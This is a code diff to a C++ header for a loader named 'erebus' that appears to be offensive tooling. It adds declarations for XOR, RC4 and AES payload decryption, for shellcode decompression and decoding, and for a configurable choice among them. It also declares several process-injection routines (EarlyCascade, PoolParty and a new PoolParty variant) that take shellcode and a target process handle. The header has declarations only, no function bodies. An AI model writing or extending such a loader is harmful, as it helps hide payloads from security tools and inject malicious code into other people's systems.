@@ -1,9 +1,13 @@
 #ifndef EREBUS_LOADER_HPP
 #define EREBUS_LOADER_HPP
 #pragma once
+
+#include <stdlib.h>
+#include <cstdlib>
 #include <windows.h>
 #include <winbase.h>
 
+// Define missing SAL annotations for compatibility
 #ifndef _In_
 #define _In_
 #endif
@@ -51,10 +55,10 @@
 #pragma region [typedefs]
 
 typedef struct _PROCESSOR_NUMBER {
-	WORD Group;
-	BYTE Number;
-	BYTE Reserved;
-} PROCESSOR_NUMBER, *PPROCESSOR_NUMBER;
+	USHORT Group;
+	UCHAR  Number;
+	UCHAR  Reserved;
+} PROCESSOR_NUMBER, * PPROCESSOR_NUMBER;
 
 typedef struct _UNICODE_STRING {
 	USHORT Length;
@@ -89,7 +93,6 @@ typedef struct _PEB_LDR_DATA {
 typedef struct _SECTION_IMAGE_INFORMATION
 {
 	PVOID TransferAddress;
-	ULONG ZeroBits;
 	SIZE_T MaximumStackSize;
 	SIZE_T CommittedStackSize;
 	ULONG SubSystemType;
@@ -1730,47 +1733,91 @@ typedef enum _NETSETUP_JOIN_STATUS {
 
 typedef enum _WORKERFACTORYINFOCLASS
 {
-    WorkerFactoryTimeout, // LARGE_INTEGER
-    WorkerFactoryRetryTimeout, // LARGE_INTEGER
-    WorkerFactoryIdleTimeout, // s: LARGE_INTEGER
-    WorkerFactoryBindingCount, // s: ULONG
-    WorkerFactoryThreadMinimum, // s: ULONG
-    WorkerFactoryThreadMaximum, // s: ULONG
-    WorkerFactoryPaused, // ULONG or BOOLEAN
-    WorkerFactoryBasicInformation, // q: WORKER_FACTORY_BASIC_INFORMATION
-    WorkerFactoryAdjustThreadGoal,
-    WorkerFactoryCallbackType,
-    WorkerFactoryStackInformation, // 10
-    WorkerFactoryThreadBasePriority, // s: ULONG
-    WorkerFactoryTimeoutWaiters, // s: ULONG, since THRESHOLD
-    WorkerFactoryFlags, // s: ULONG
-    WorkerFactoryThreadSoftMaximum, // s: ULONG
-    WorkerFactoryThreadCpuSets, // since REDSTONE5
-    MaxWorkerFactoryInfoClass
-} WORKERFACTORYINFOCLASS, *PWORKERFACTORYINFOCLASS;
+	WorkerFactoryTimeout, // LARGE_INTEGER
+	WorkerFactoryRetryTimeout, // LARGE_INTEGER
+	WorkerFactoryIdleTimeout, // s: LARGE_INTEGER
+	WorkerFactoryBindingCount, // s: ULONG
+	WorkerFactoryThreadMinimum, // s: ULONG
+	WorkerFactoryThreadMaximum, // s: ULONG
+	WorkerFactoryPaused, // ULONG or BOOLEAN
+	WorkerFactoryBasicInformation, // q: WORKER_FACTORY_BASIC_INFORMATION
+	WorkerFactoryAdjustThreadGoal,
+	WorkerFactoryCallbackType,
+	WorkerFactoryStackInformation, // 10
+	WorkerFactoryThreadBasePriority, // s: ULONG
+	WorkerFactoryTimeoutWaiters, // s: ULONG, since THRESHOLD
+	WorkerFactoryFlags, // s: ULONG
+	WorkerFactoryThreadSoftMaximum, // s: ULONG
+	WorkerFactoryThreadCpuSets, // since REDSTONE5
+	MaxWorkerFactoryInfoClass
+} WORKERFACTORYINFOCLASS, * PWORKERFACTORYINFOCLASS;
+
+#pragma endregion
+
+#pragma region [bcrypt_typedefs]
+
+typedef NTSTATUS(WINAPI* typeBCryptOpenAlgorithmProvider)(
+	_Out_ PVOID* phAlgorithm,
+	_In_ LPCWSTR pszAlgId,
+	_In_opt_ LPCWSTR pszImplementation,
+	_In_ ULONG dwFlags);
+
+typedef NTSTATUS(WINAPI* typeBCryptSetProperty)(
+	_Inout_ PVOID hObject,
+	_In_ LPCWSTR pszProperty,
+	_In_reads_bytes_(cbInput) PUCHAR pbInput,
+	_In_ ULONG cbInput,
+	_In_ ULONG dwFlags);
+
+typedef NTSTATUS(WINAPI* typeBCryptDecrypt)(
+	_Inout_ PVOID hKey,
+	_In_reads_bytes_opt_(cbInput) PUCHAR pbInput,
+	_In_ ULONG cbInput,
+	_In_opt_ PVOID pPaddingInfo,
+	_Inout_updates_bytes_opt_(cbIV) PUCHAR pbIV,
+	_In_ ULONG cbIV,
+	_Out_writes_bytes_to_opt_(cbOutput, *pcbResult) PUCHAR pbOutput,
+	_In_ ULONG cbOutput,
+	_Out_ ULONG* pcbResult,
+	_In_ ULONG dwFlags);
+
+typedef NTSTATUS(WINAPI* typeBCryptGenerateSymmetricKey)(
+	_Inout_ PVOID hAlgorithm,
+	_Out_ PVOID* phKey,
+	_Out_writes_bytes_all_opt_(cbKeyObject) PUCHAR pbKeyObject,
+	_In_ ULONG cbKeyObject,
+	_In_reads_bytes_(cbSecret) PUCHAR pbSecret,
+	_In_ ULONG cbSecret,
+	_In_ ULONG dwFlags);
+
+typedef NTSTATUS(WINAPI* typeBCryptCloseAlgorithmProvider)(
+	_Inout_ PVOID hAlgorithm,
+	_In_ ULONG dwFlags);
+
+typedef NTSTATUS(WINAPI* typeBCryptDestroyKey)(_Inout_ PVOID hKey);
 
 #pragma endregion
 
 #pragma region [ntapi_typedefs]
 
 typedef NTSTATUS(NTAPI* typeNtCreateWorkerFactory)(
-    _Out_ PHANDLE WorkerFactoryHandleReturn,
-    _In_ ACCESS_MASK DesiredAccess,
-    _In_opt_ PCOBJECT_ATTRIBUTES ObjectAttributes,
-    _In_ HANDLE CompletionPortHandle,
-    _In_ HANDLE WorkerProcessHandle,
-    _In_ PVOID StartRoutine,
-    _In_opt_ PVOID StartParameter,
-    _In_opt_ ULONG MaxThreadCount,
-    _In_opt_ SIZE_T StackReserve,
-    _In_opt_ SIZE_T StackCommit
+	_Out_ PHANDLE WorkerFactoryHandleReturn,
+	_In_ ACCESS_MASK DesiredAccess,
+	_In_opt_ PCOBJECT_ATTRIBUTES ObjectAttributes,
+	_In_ HANDLE CompletionPortHandle,
+	_In_ HANDLE WorkerProcessHandle,
+	_In_ PVOID StartRoutine,
+	_In_opt_ PVOID StartParameter,
+	_In_opt_ ULONG MaxThreadCount,
+	_In_opt_ SIZE_T StackReserve,
+	_In_opt_ SIZE_T StackCommit
 	);
 
 typedef NTSTATUS(NTAPI* typeNtSetInformationWorkerFactory)(
-    _In_ HANDLE WorkerFactoryHandle,
-    _In_ WORKERFACTORYINFOCLASS WorkerFactoryInformationClass,
-    _In_reads_bytes_(WorkerFactoryInformationLength) PVOID WorkerFactoryInformation,
-    _In_ ULONG WorkerFactoryInformationLength
+	_In_ HANDLE WorkerFactoryHandle,
+	_In_ WORKERFACTORYINFOCLASS WorkerFactoryInformationClass,
+	_In_reads_bytes_(WorkerFactoryInformationLength) PVOID WorkerFactoryInformation,
+	_In_ ULONG WorkerFactoryInformationLength
 	);
 
 typedef NTSTATUS(NTAPI* PUSER_THREAD_START_ROUTINE)(
@@ -2136,10 +2183,10 @@ typedef NTSTATUS(NTAPI* typeNtWaitForSingleObject)(
 
 typedef NTSTATUS(NTAPI* typeRtlInitUnicodeString)(
 	_Out_ PUNICODE_STRING DestinationString,
-	_In_opt_z_ PCWSTR SourceString
+	_In_opt_z_  PCWSTR SourceString
 	);
 
-typedef NTSTATUS(NTAPI* RtlInitUnicodeStringEx)(
+typedef NTSTATUS(NTAPI* typeRtlCreateUnicodeString)(
 	_Out_ PUNICODE_STRING DestinationString,
 	_In_opt_z_ PCWSTR SourceString
 	);
@@ -2220,10 +2267,27 @@ typedef NTSTATUS(NTAPI* RtlInitUnicodeStringEx)(
 # pragma endregion
 
 typedef VOID(*typeInjectionMethod)(IN BYTE* shellcode, IN SIZE_T shellcode_size, IN HANDLE hProcess, IN HANDLE hThread);
+typedef VOID(*typeDecryptionMethod)(_Inout_ BYTE* Input, IN SIZE_T InputLen, IN BYTE* Key, IN SIZE_T KeyLen);
+typedef VOID(*typeDecompressionMethod)(_Inout_ BYTE** Input, _Inout_ SIZE_T* InputLen);
+typedef BOOL(*typeDecodeMethod)(_In_ const CHAR* Input, IN SIZE_T InputLen, _Out_ BYTE** Output, _Out_ SIZE_T* OutputLen);
+
 
 namespace erebus {
+	enum CompressionFormat {
+		FORMAT_NONE = 0,
+		FORMAT_LZNT1 = 1,
+		FORMAT_RLE = 2,
+		FORMAT_BASE64 = 3,
+		FORMAT_ASCII85 = 4,
+		FORMAT_ALPHA32 = 5,
+		FORMAT_WORDS256 = 6
+	};
+
 	struct Config {
 		typeInjectionMethod injection_method;
+		typeDecryptionMethod decryption_method;
+		typeDecompressionMethod decompression_method;
+		typeDecodeMethod decode_method;
 	};
 
 	extern Config config;
@@ -2292,6 +2356,8 @@ namespace erebus {
 	//
 	HMODULE LoadLibraryC(_In_ PCWSTR dll_name);
 
+	VOID RtlFreeHeapC(_In_ HANDLE HeapHandle, _In_ ULONG Flags, _In_ PVOID HeapBase);
+
 	//
 	// Cleanup Module After Use
 	//
@@ -2299,7 +2365,8 @@ namespace erebus {
 
 	VOID DecompressionLZNT(_Inout_ BYTE** Input, _Inout_ SIZE_T* InputLen);
 
-	VOID DecompressionRLE(_Inout_ BYTE* Input, IN SIZE_T InputLen, OUT SIZE_T* OutputLen);
+	VOID DecompressionRLE(_Inout_ BYTE** Input, _Inout_ SIZE_T* InputLen);
+	// VOID DecompressionRLE(_Inout_ BYTE* Input, IN SIZE_T InputLen, OUT SIZE_T* OutputLen);
 
 	BYTE DecodeBASE64Char(CHAR c);
 
@@ -2321,7 +2388,15 @@ namespace erebus {
 
 	VOID AutoDetectAndDecodeString(_In_ CHAR* Input, IN SIZE_T InputLen, _Out_ BYTE** Output, _Out_ SIZE_T* OutputLen);
 
-	VOID DecryptionXOR(_Inout_ BYTE* Input, IN SIZE_T InputLen, IN BYTE* Key, IN SIZE_T KeyLen);
+	VOID DecryptionXor(unsigned char* data, size_t len, unsigned char* key, size_t key_len);
+
+	VOID DecryptionRc4(unsigned char* data, size_t len, unsigned char* key, size_t key_len);
+
+	VOID DecryptionAES(_Inout_ BYTE* Input, IN SIZE_T InputLen, IN BYTE* Key, IN SIZE_T KeyLen);
+
+	VOID DecompressShellcode(_Inout_ BYTE** Shellcode, _Inout_ SIZE_T* ShellcodeLen);
+
+	VOID AutoDetectAndProcess(_Inout_ BYTE** Shellcode, _Inout_ SIZE_T* ShellcodeLen, _In_opt_ BYTE* Key, _In_opt_ SIZE_T KeyLen);
 
 	BOOL StageResource(IN int resource_id, IN LPCWSTR resource_class, OUT PBYTE* shellcode, OUT SIZE_T* shellcode_size);
 
@@ -2338,6 +2413,8 @@ namespace erebus {
 	VOID InjectionEarlyCascade(IN BYTE* shellcode, IN SIZE_T shellcode_size, IN HANDLE process_handle, IN HANDLE thread_handle);
 
 	VOID InjectionPoolParty(IN BYTE* shellcode, IN SIZE_T shellcode_size, IN HANDLE process_handle, IN HANDLE thread_handle);
+
+	VOID InjectionPoolPartyAlt(IN BYTE* shellcode, IN SIZE_T shellcode_size, IN HANDLE process_handle, IN HANDLE thread_handle);
 } // End of erebus namespace
 
 #endif
